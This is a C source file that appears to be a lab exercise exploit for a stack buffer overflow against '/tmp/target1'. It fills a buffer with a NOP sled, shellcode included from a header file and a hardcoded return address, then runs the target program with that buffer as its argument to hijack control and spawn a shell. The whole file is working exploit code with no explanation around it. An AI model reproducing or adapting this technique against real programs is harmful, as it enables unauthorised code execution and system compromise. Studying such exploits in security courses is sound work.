#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"
#define NOP	0x90
int main(void)
{
  char *args[3];
  char *env[1];
  char *buff, *ptr;

  long *addr_ptr , addr;

  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
  env[0] = NULL;
  addr = 0xbffffd78;
  printf("Using address: 0x%x\n", addr);
  int bsize = 512;
  buff = malloc(bsize);
  ptr = buff;
  addr_ptr = (long *) ptr;
  int i=0;
  for (i =0;i<bsize;i+=4){
  	*(addr_ptr++)= addr;
  }

  for (i=0;i<100;i++){
  	buff[i] = NOP;
  }
  ptr = buff + ((100)-(strlen(shellcode)/2));
  
  for (i = 0;i<strlen(shellcode);i++){
  	*(ptr++) = shellcode[i];
  }

  buff[bsize-1] = '\0';
  args[1] = buff;

  if (0 > execve(TARGET, args, env)){
    fprintf(stderr, "execve failed.\n");
	}
  return 0;
}
